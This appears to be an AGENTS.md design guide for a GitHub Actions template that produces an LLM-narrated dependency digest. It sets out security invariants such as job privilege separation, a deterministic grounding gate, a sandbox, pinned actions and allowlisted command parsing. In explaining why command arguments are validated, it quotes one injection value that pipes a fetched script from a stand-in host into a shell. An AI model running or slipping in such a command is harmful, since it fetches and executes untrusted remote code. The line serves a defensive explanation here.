# AGENTS.md — the rules this repository is built on

> **Read this before editing anything.** Every rule below is either enforced by a
> check in `.github/workflows/ci.yml` or it is not a rule — it is a preference.
> Rules are listed with the check that enforces them. If you add a feature and a
> check starts failing, the check is right until proven otherwise.

This repository is a **template**. A user clicks "Use this template", sets two or
three repository variables, optionally one secret, and gets an agent that watches
their stack and narrates a daily digest. There is no server, no database, no
front-end build step, and no vendor of ours in the loop.

---

## 0. The one sentence

**The repository is the instance, and git is the only durable store.**

Everything below is a consequence of that. If a change needs a database, a
long-lived process, or an inbound port, it does not belong in this repository.

---

## 1. Invariants

### I1 — One privilege per job

> *No component holds both a secret and a write token.*

A job may hold a secret, or it may hold `contents: write` / `issues: write` /
`pull-requests: write`. It may not hold both. This is why `digest.yml` is one
file with **four** jobs rather than one job with four steps, and why the
containment gate (I2) runs in the job that has no model key.

- **Enforced by:** `lib/invariants.mjs` → `checkOnePrivilegePerJob()`, run in CI.
- **Enforced by:** `lib/invariants.mjs` → `checkSandboxIsolated()`.
- **Why it erodes:** it is easy to merge two jobs "just for latency". The merge
  is always a downgrade; the latency is seconds.

### I2 — The gate decides, and the gate cannot be hijacked

> *Every entity in generated prose must appear in the fetched payload.*

"Entity" = `{advisory id, package name, version literal, numeric token}`. Not
just numbers: a hallucinated `GHSA-…` identifier inside a fluent sentence is the
same failure class as an invented version number.

The gate runs **only** in a job that holds no model key (`commit` in
`digest.yml`, `reply` in `ask.yml`). A gate that shares a job with the model is a
gate the model's input can influence.

- **Enforced by:** `lib/gate.mjs`, called from `scripts/commit-step.mjs` and
  `scripts/reply-step.mjs`; unit-tested in `tests/gate.test.mjs`.
- **Hard limit:** the gate is exact and deterministic and must stay that way. A
  paraphrase-tolerant second pass may only ever *queue a sentence for human
  review*. It must never gate a commit.

### I3 — Bounded writes, fail-closed

Only these paths may be written:

| Writer | Allowlist |
|---|---|
| Collector (the pipeline, at runtime) | `data/`, `history/`, `digest/`, `assets/`, `README.md` |
| CI (rendering, at commit time) | the above plus `site/` |

Any unexpected path aborts **before** commit. Enforced inside the writer
(`lib/store.mjs`) and again in CI as a diff check over `git status --porcelain`.

`site/` deliberately appears in the CI allowlist but not the collector's: who may
write what is a separation, not a duplication.

### I4 — Everything is behind the change gate except one file

`writeIfChanged()` compares content before writing. A state file strips its own
timestamp before comparing, so a no-op run does not restamp. Without this, four
runs a day is ~1,460 commits a year of identical files.

**Exactly one file is exempt: `data/heartbeat.json`.** It is always rewritten,
never hashed, never diffed. This is not tidiness — it is the mitigation for the
60-day trap: a broken agent that writes the same failure state twice would commit
nothing, go silent, and have its schedule disabled. `consecutive_failures` moves
monotonically while the agent is broken, so there is no state in which a run
commits nothing.

- **Enforced by:** `lib/store.mjs` (`isGateExempt()`), asserted in
  `tests/store.test.mjs`.

### I5 — Append-only history, hash-chained

`history/runs.jsonl` chains: each row's hash covers the previous row's hash.
Verified on every run; a broken chain fails the run loudly.

Events are **transitions, not snapshots** — `added`, `bumped`, `flagged`,
`cleared`. History is written when semantic state changes, not when the clock
ticks.

Narration is **excluded** from the chain. Prose is generated content, not a fact
about the world; hashing it would make the chain churn on every phrasing tweak.

### I6 — Commands are parsed, never interpreted

The comment body is **never** passed to a model as an instruction. The verb is
matched by regex against an allowlist of eight verbs — seven command shapes, since
`pause` and `resume` are one toggle. The argument is validated against the watch
list in `data/stack.json`. Free text is rejected.

Four rules, all structural, all in `lib/commands.mjs`:

1. **Author gate** — `author_association ∈ {OWNER, MEMBER, COLLABORATOR}`, and an
   **exit**, not a warning.
2. **Grammar, not model** — regex over the allowlist; at most the parsed argument
   reaches a model, and only for `explain`.
3. **Argument validation** — must appear in the watch list. This removes the
   shell-interpolation surface entirely: `"; curl evil.sh | sh` fails the parse,
   it never becomes a command.
4. **Idempotency** — `{comment_id, author, verb, arg, started_at, outcome}` is
   written to `history/commands.jsonl` **before** acting. GitHub permits re-runs
   and users perform them; a re-run must not bump a dependency twice.

### I7 — The sandbox never receives a secret, and ships off by default

The sandbox is a container inside an Actions job. It has no session and cannot
have one, because every Actions job is a fresh VM destroyed at the end of the
run — no attach, no pause, no resume.

- `sandbox.yml` declares `permissions: {}` and receives **no** secrets.
- Child containers run `--network none --read-only --cap-drop ALL
  --security-opt no-new-privileges --user 65534:65534`, with
  `LLM_API_KEY: ""` passed **explicitly empty** so it cannot be inherited.
- Dependencies are installed in the trusted parent **before** the network is cut;
  the prepared workspace is mounted read-only.
- **Enabled by `SANDBOX_ENABLED`, default `false`.** The strongest property in
  this design is that the default instantiation executes no third-party code at
  all.

The self-test is: **if `sudo` works inside the sandbox, the sandbox has already
leaked.** `lib/sandbox.mjs` asserts this on every run.

### I8 — No provider names in the code

The agent must not have an opinion about which endpoint you use, so it must not
contain one. `lib/llm.mjs` takes a base URL and a model name and knows nothing
else. There is **no default endpoint and no fallback**: if no base URL is
configured, the rules-only path (§I9) produces the whole digest and no model is
contacted.

Configuration surface, and nothing more:

| Name | Kind | Value |
|---|---|---|
| `LLM_API_KEY` | secret | the user's own key |
| `JEV_API_KEY` | secret, optional | only when `JEV_ENABLED` is true |
| `LLM_BASE_URL` | variable | any OpenAI-compatible root |
| `LLM_MODEL` | variable | model or deployment name |
| `LLM_TOKEN_BUDGET` | variable | tokens per run, default `60000` |
| `JEV_ENABLED` | variable | `false` (default) |
| `JEV_BASE_URL` | variable | the typed layer's root, including its version prefix — the endpoint called is `POST {JEV_BASE_URL}/systemone`; only when `JEV_ENABLED` is true |
| `JEV_MODEL` | variable | model or deployment name for the typed layer; default `jev-latest` |
| `SANDBOX_ENABLED` | variable | `false` (default) |
| `AGENT_LANG` | variable | reply language, default `en` |

- **Enforced by:** `lib/invariants.mjs` → `checkNoVendorNames()`.
- **Enforced by:** `lib/invariants.mjs` → `checkConfigSurface()` (I14), which
  asserts this table and the workflows agree in both directions. Measured against
  the tree as it stood: two names were read by a workflow and absent from the
  table (`JEV_BASE_URL`, `LLM_TOKEN_BUDGET`), and one was read by the code and
  delivered by no workflow (`JEV_MODEL`). "And nothing more" is exactly the kind
  of claim that needs a check rather than a promise.

### I9 — The agent is fully useful with no model key

The advisory rules tier in `lib/triage.mjs` is a real implementation, not a
placeholder. `JEV_ENABLED` defaults to `false`. So a user with no key at all
still gets a complete, correct, gated digest — narration is simply the
deterministic template.

Enabling a decision layer **adds** a tier; it never switches providers.

**The typed layer's decision rule is a band, not a threshold.** A `noul` answer
is a probability that carries its own certainty, so a value near the middle is
*no signal* rather than medium intensity — `>= 0.5` is the wrong way to read one,
and a single threshold therefore has to guess in exactly the region where
guessing is least defensible. The band is symmetric about the middle and its
width is set by τ, so there is still exactly one tunable parameter. A score
inside the band, an absent answer, and two answers that disagree all escalate:
none of them resolves to a decision.

- **Enforced by:** `tests/triage.test.mjs`, the `noul` band tests.
- **Why it erodes:** `noul` has no `confidence` field. Reading one anyway does
  not fail — it returns `undefined` — and the reflexive `?? 1` guard turns "no
  such field" into *maximum certainty*, which silently disables the check it was
  written to perform. A fallback on a response field the layer is expected to
  send must default to **escalate**, never to **permit**.
- **The request body is asserted, not assumed.** `tests/triage.test.mjs` pins
  `{model, questions, state}`, with `model` a **string** and `selectedModels`
  absent. A stubbed *response* cannot catch a wrong *request*: the stub is wrong
  in the same direction as the code, so it stays green forever. That is how a
  request that failed validation on every call shipped with 161 tests passing.

### I10 — The web surface holds no key and calls no model

`site/chat.html` is a **composer, not a client.** It builds a prefilled issue
URL, the user submits it already authenticated, the workflow runs in Actions, and
the reply lands as a comment the page renders on next load.

A page that calls an endpoint directly is rejected for three reasons, each
individually fatal: the key would be public; there is no fetched payload to
validate against, so nothing grounds the answer; and no row is written to
`history/commands.jsonl`, so the answer is unauditable.

**The one thing that must not happen:** the page must never gain a direct route
to execution — no endpoint, no token, no browser-triggered dispatch. A static
page *cannot* trigger a workflow (that needs a token carrying `actions: write`),
so this boundary is enforced by the platform, not by discipline. Keep it that
way.

**Ungrounded answers must be marked, permanently and visibly.** The digest is
verified; "dev help" is not. Rendering them in the same visual style destroys the
property I2 exists to buy.

### I11 — Honesty about time

Scheduled workflows are delayed under load and may be dropped. So a digest is
stamped with the **observation time**, never with the schedule. "As of 06:12 UTC"
is honest; "today's briefing" is a small lie that will eventually be caught.

### I12 — Third-party actions are pinned to a commit

> *A tag is a mutable pointer. A commit is not.*

`actions/checkout@v4` is resolved by GitHub at run time. Whoever can move that
tag controls code that executes inside a job holding the user's write token — and
the move leaves no trace in this repository. So every `uses:` must name a 40-hex
commit; the human-readable release goes in a trailing comment.

A local reusable workflow (`./.github/workflows/…`) is exempt: it is this
repository, at the commit being run, not a third party. A container action
(`docker://`) must be pinned by digest instead.

- **Enforced by:** `lib/invariants.mjs` → `checkActionsPinned()`.
- **Upgrading:** change the SHA and the comment together, in one diff. That diff
  is the entire point of the rule — it is the moment a human looks.

### I13 — The cheap guard mirrors the real gate

Two copies of one allowlist exist by necessity. `lib/commands.mjs` decides, and
the workflow `if:` pre-filters so a stranger's comment never starts a runner at
all. Two copies of a rule drift, so the workflow must name **exactly** the
allowlist the script declares — read out of the script, not restated here.

Equality, not containment. A pre-filter *looser* than the gate is the dangerous
direction. A pre-filter *stricter* than the gate silently drops legitimate
commands, which is its own bug.

Two details that are load-bearing and were both found by writing the check:

- **The association is read per event.** `github.event.comment` is `null` on an
  `issues` event, and a null comparison is not a rejection — `null != 'NONE'` is
  `true`. A single condition admits a stranger's `/agent`-titled issue by
  accident.
- **The title prefix carries its delimiter.** `startsWith(title, '/agent')` also
  matches `/agentfoo`. The composer and the issue template both emit `/agent`
  followed by a space, so requiring the space costs nothing and means the
  pre-filter admits only what it claims to.

- **Enforced by:** `lib/invariants.mjs` → `checkAuthorGateMirrorsScript()`.
- **Not a substitute for I6.** The `if:` filters an *event*; the script checks a
  *value*. The script still exits, and must keep exiting.

### I14 — The configuration surface agrees with its documentation, both ways

The table under I8 says "and nothing more". That is a claim about two files at
once, and it had already drifted in both directions before this check existed:

- **workflow → table.** `digest.yml` read `vars.JEV_BASE_URL`; the table did not
  list it. A user reading the table could not have known to set it, and the
  typed layer would have fallen back to the rules tier with no explanation.
- **code → workflow.** `scripts/narrate-step.mjs` read `JEV_MODEL`; no workflow
  passed it. The table documented a knob that did not exist at runtime — the
  quietest possible failure, because nothing errors when an unset variable is
  read.

Neither is visible by reading either file alone. So:

- every `vars.*` / `secrets.*` a workflow references appears in the I8 table;
- every `LLM_*` / `JEV_*` name the code reads is passed by some workflow **and**
  appears in the table.

The second direction is scoped to those two prefixes on purpose. Everything else
a step reads — `COMMENT_ID`, `NARRATE_RESULT`, `PROBE_ENDPOINT` — is plumbing the
workflow composes out of `needs.*` and `github.*`. Demanding a table row for each
would be noise, and a noisy check is a disabled check.

`secrets.GITHUB_TOKEN` is excluded, for the reason I1 excludes it: the platform
supplies it, the user cannot configure it, and it is not a row.

- **Enforced by:** `lib/invariants.mjs` → `checkConfigSurface()`.
- **Fails loudly, never vacuously.** If the table anchor is missing, or the table
  parses to zero rows, the check fails rather than reporting success over an
  empty set.

---

## 2. Where this runs

**This template is public and holds no secrets. A user's instance is private.**
Those are different repositories, and the separation is the security story rather
than a deployment preference.

| Repository | Visibility | Holds | Runs |
|---|---|---|---|
| Template — this one | public | no secrets; the seed `data/stack.json` | a live demo digest |
| Instance | private | the user's stack, the user's key | the user's digest |
| Status — optional | public | a subset marked publishable | a second, redacted digest |

Three consequences that shape what may be committed here:

1. **The seed stack is a demo, not a placeholder.** This repository runs the real
   pipeline against `data/stack.json` on a schedule and publishes the result. It
   is worth watching, and it is harmless to publish, because it watches a handful
   of widely-used packages and one public feed. Keep it that way: a seed entry
   that is *specific to one organisation* does not belong here, because the demo
   digest is public.
2. **No secret may ever be added here.** Not a default, not an example, not
   "temporarily". The instance carries the key. The configuration table in I8 is
   the entire surface, and every entry in it is a variable or a secret the user
   sets in their own copy.
3. **The instance is created with "Use this template", never a fork.** A fork of
   a public repository is public and cannot be made private, and it stays tied to
   its upstream. "Use this template" produces a copy with independent history,
   settings and secrets. `README.md` says this to users; this file says it to
   contributors, because a change that only works when the repository is private
   breaks the template.

- **Enforced by:** `ci.yml` → `no-secrets-in-tree` refuses a credential-shaped
  string anywhere in the tree.
- **Stated for reporters in:** `SECURITY.md`.
- **Not enforced by anything:** "this seed entry is too specific". That is a
  judgement, and it is the one rule in this document that is a preference. It is
  written down so a reviewer can point at it.

---

## 3. Layout

```
.github/workflows/   digest (4 jobs) · ask (3 jobs) · act · sandbox · pages · ci
.github/CODEOWNERS   the paths where a quiet change is worse than a loud one
lib/                 the documented five: llm · probe · commands · sandbox · triage
                     plus internals: store · version · gate · sources · render · invariants
scripts/             one entry point per job
data/                state — all behind the gate except heartbeat.json
history/             append-only: events · commands · runs (hash-chained)
digest/              dated archive
site/                index.html (digest view) · chat.html (composer)
README.md            regenerated between markers
SECURITY.md          what is in scope for a report, and what is not
```

The five named modules in `lib/` are the documented surface. Everything else in
`lib/` exists to keep them single-purpose.

---

## 4. Local development

```bash
npm test                     # unit tests, no network
npm run check                # invariant checks over the workflows on disk
node scripts/fetch-step.mjs  # dry run; writes .run/payload.json, no commit
```

`fetch` and `narrate` are read-only and safe to run locally. `commit` writes —
run it only in CI unless you know why you are running it.

To run the whole pipeline locally without touching git:

```bash
node scripts/fetch-step.mjs && node scripts/narrate-step.mjs && \
  node -e "import('./lib/gate.mjs').then(async g=>{...})"
```

---

## 5. Adding things

- **A new verb** goes in `lib/commands.mjs` first, with its argument validator,
  then in the reply renderer. If it calls a model, it belongs in the `explain`
  job, not `route`.
- **A new source** goes in `lib/sources.mjs` and must be keyless or already
  authenticated. A source needing a new secret needs a new job, because of I1.
- **A new output surface** must be added to the write allowlist deliberately
  (I3), and must not move the gate out of the keyless job (I2).
- **A new action** must be pinned to a 40-hex commit with the release in a
  trailing comment (I12). `checkActionsPinned()` will refuse a tag.
- **A new configuration variable** goes in the I8 table in this file, then in the
  `env:` of every workflow that needs it (I14). The table is the source, not the
  afterthought — `checkConfigSurface()` reads it and will fail either half if you
  do one and not the other.
- **A new rule** is not a rule until `lib/invariants.mjs` checks it and
  `tests/invariants.test.mjs` proves the check fires. A check that has never been
  seen to fail is a check nobody can trust — write the synthetic case that breaks
  it before you write the code that fixes it.
- **A new outbound API call** is asserted on the **request**, not only on the
  response. A stub that answers whatever the code asks stays green while the
  request is being rejected by the real service; assert the body the code sends
  against the field names the vendor documents.
- **Do not merge jobs.** See I1.

---

## 6. When a check fires

The checks in this repository have, so far, been right and the code wrong. Four
of them were load-bearing on the day they were written:

- the containment gate rejected **every** grounded sentence, because the version
  and advisory-id extractors read version literals as package names;
- the one-privilege-per-job check was **not enforcing anything**, because the
  YAML reader popped its own sequence frame and could not see `secrets.` inside a
  step;
- the config-surface check (I14) found, on first run, two names a workflow asked
  for that the table did not list, and one the code read that no workflow
  delivered;
- the fact-grounding test, run over the typed-layer path, found the reason string
  for the escalation band contained a word the gate reads as a package name —
  which is the check catching prose, not a fact, and the reason the reason
  strings are deliberately number-free and plain.

All passed review. All were found by writing a test that asserted the intended
behaviour rather than the implemented one. So:

**When a check fires, the first hypothesis is that the check is right.** Read the
rule, then read the code it covers, then decide. "The check is too strict" is a
conclusion, not a starting position.
